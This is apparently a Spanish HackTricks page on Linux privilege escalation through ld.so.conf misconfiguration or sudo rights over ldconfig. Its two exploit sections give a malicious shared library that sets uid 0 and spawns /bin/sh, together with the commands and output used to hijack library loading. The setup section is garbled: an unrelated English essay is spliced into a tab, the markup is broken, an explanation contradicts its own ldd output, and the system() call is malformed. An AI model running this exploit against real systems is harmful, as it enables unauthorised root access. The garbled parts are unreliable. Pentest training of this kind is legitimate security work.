## Ejemplo de explotación de privesc de ld.so

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Preparar el entorno

En la siguiente sección se puede encontrar el código de los archivos que vamos a utilizar para preparar el entorno

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```
{% endtab %}

{% tab title="ld.so.conf Example" %}
# ld.so.conf Example

This file is used by the dynamic linker/loader (`ld-linux.so`) to determine the libraries that need to be loaded for a given executable. By default, it looks for this file in `/etc/ld.so.conf` and any files in the `/etc/ld.so.conf.d/` directory.

The format of the file is simple: each line contains the path to a directory containing shared libraries. Lines starting with `#` are treated as comments.

Here's an example `ld.so.conf` file:

```text
# libc default configuration
/usr/local/lib

# Additional libraries
/opt/custom/lib
```

This file tells the dynamic linker to look for shared libraries in `/usr/local/lib` and `/opt/custom/lib`. If you install a new library in one of these directories, you don't need to update any environment variables or configuration files; the dynamic linker will automatically find it.

## Security Implications

If an attacker can modify the `ld.so.conf` file, they can potentially execute arbitrary code with elevated privileges. For example, they could add a directory containing a malicious shared library to the file, causing the dynamic linker to load it when a privileged program is executed.

To prevent this type of attack, you should ensure that the `ld.so.conf` file is only writable by the `root` user, and that it is not world-readable. Additionally, you should monitor the file for changes and investigate any unexpected modifications.

## References

- [ld.so.conf(5) man page](http://man7.org/linux/man-pages/man5/ld.so.conf.5.html)
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="ld.so.conf.d/custom.conf" %}

# Custom libraries path
/home/user/custom_libs

{% endtab %}

{% tab title="ld.so.conf" %}

include ld.so.conf.d/*.conf

{% endtab %}

{% tab title="ldd output" %}

```
$ ldd /bin/bash
        linux-vdso.so.1 =>  (0x00007ffce8bfe000)
        libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f5c5d5d2000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f5c5d3ce000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5c5d00e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5c5d9f2000)
```

{% endtab %}

{% tab title="Explanation" %}

Este ejemplo muestra cómo agregar una ruta personalizada para bibliotecas compartidas en el archivo `/etc/ld.so.conf.d/custom.conf`. En este caso, la ruta `/home/user/custom_libs` se agrega al archivo. Luego, se utiliza el comando `ldd` para verificar que la biblioteca compartida `libtinfo.so.5` se carga desde la ruta personalizada en lugar de la ruta predeterminada. Esto puede ser útil para cargar versiones personalizadas de bibliotecas compartidas o para evitar conflictos con versiones predeterminadas de bibliotecas compartidas.

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Crea** esos archivos en tu máquina en la misma carpeta.
2. **Compila** la **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` a `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilegios de root)
4. **Compila** el **ejecutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifica el entorno

Verifica que _libcustom.so_ se está **cargando** desde _/usr/lib_ y que puedes **ejecutar** el binario.
```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
	
$ ./sharedvuln 
Welcome to my amazing application!
Hi
```
## Exploit

En este escenario vamos a suponer que **alguien ha creado una entrada vulnerable** dentro de un archivo en _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
La carpeta vulnerable es _/home/ubuntu/lib_ (donde tenemos acceso de escritura).\
**Descarga y compila** el siguiente código dentro de esa ruta:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh",NULL,NULL);
}
```
Ahora que hemos **creado la biblioteca maliciosa libcustom dentro de la ruta mal configurada**, necesitamos esperar a que se produzca un **reinicio** o que el usuario root ejecute **`ldconfig`** (_en caso de que puedas ejecutar este binario como **sudo** o tenga el bit **suid** podrás ejecutarlo tú mismo_).

Una vez que esto haya sucedido, **vuelve a verificar** desde dónde se está cargando la biblioteca `libcustom.so` en el ejecutable `sharevuln`:
```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como puedes ver, se está cargando desde `/home/ubuntu/lib` y si algún usuario lo ejecuta, se ejecutará una shell:
```c
$ ./sharedvuln 
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Tenga en cuenta que en este ejemplo no hemos escalado privilegios, pero modificando los comandos ejecutados y **esperando a que el usuario root u otro usuario privilegiado ejecute el binario vulnerable**, podremos escalar privilegios.
{% endhint %}

### Otras configuraciones incorrectas - Misma vulnerabilidad

En el ejemplo anterior simulamos una configuración incorrecta donde un administrador **estableció una carpeta no privilegiada dentro de un archivo de configuración dentro de `/etc/ld.so.conf.d/`**.\
Pero hay otras configuraciones incorrectas que pueden causar la misma vulnerabilidad, si tiene **permisos de escritura** en algún **archivo de configuración** dentro de `/etc/ld.so.conf.d`, en la carpeta `/etc/ld.so.conf.d` o en el archivo `/etc/ld.so.conf`, puede configurar la misma vulnerabilidad y explotarla.

## Exploit 2

**Supongamos que tiene privilegios sudo sobre `ldconfig`**.\
Puede indicar a `ldconfig` **dónde cargar los archivos de configuración**, por lo que podemos aprovecharlo para hacer que `ldconfig` cargue carpetas arbitrarias.\
Entonces, creemos los archivos y carpetas necesarios para cargar "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ahora, como se indica en el **exploit anterior**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
Y finalmente, carguemos la ruta y verifiquemos desde dónde se está cargando la biblioteca binaria:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como se puede ver, teniendo privilegios de sudo sobre `ldconfig` se puede explotar la misma vulnerabilidad.**

{% hint style="info" %}
No encontré una forma confiable de explotar esta vulnerabilidad si `ldconfig` está configurado con el bit suid. Aparece el siguiente error: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## Referencias

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Máquina Dab en HTB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
